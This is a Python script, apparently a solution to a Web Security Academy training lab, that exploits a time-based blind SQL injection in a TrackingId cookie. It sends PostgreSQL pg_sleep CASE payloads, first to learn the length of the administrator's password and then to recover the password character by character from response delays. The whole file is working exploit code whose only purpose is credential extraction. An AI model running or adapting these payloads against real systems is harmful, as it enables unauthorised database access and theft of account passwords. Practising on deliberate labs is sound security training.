import requests

url = "https://0ab8004a038e7509804e265100ba0024.web-security-academy.net/"
base_tracking_id = "5CU3uoEj5qnl2ejD"
session_cookie = "mnCkX4Dnc44eXVQT2QkXCXbxRGKvvQRU"


def getLength():
    for i in range(3, 50):
        payload = (
            f"' ||  CASE WHEN ((length((SELECT password "
            f"from users where username='administrator')))={i})"
            f"THEN pg_sleep(4) ELSE pg_sleep(0) END ||'"
        )

        cookies = {"TrackingId": base_tracking_id + payload, "session": session_cookie}

        response = requests.get(url, cookies=cookies)

        if response.elapsed.total_seconds() > 3:
            return i
    return 0


charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"


def getPassword(length):
    password = ""
    for i in range(1, length + 1):
        for char in charset:
            payload = (
                f"' || CASE WHEN (SUBSTR((SELECT password "
                f"FROM users WHERE username='administrator'),{i},1)='{char}') "
                f"THEN pg_sleep(5) ELSE pg_sleep(0) END ||'"
            )

            cookies = {
                "TrackingId": base_tracking_id + payload,
                "session": session_cookie,
            }

            response = requests.get(url, cookies=cookies)

            if response.elapsed.total_seconds() > 4:
                password = password + char
                print(f"[*]Trying--->{password}...")
                break

    return password


length = getLength()
print(f"[+] Password length = {length}")

if length:
    password = getPassword(length=length)
    print(f"[+]the password: {password}")
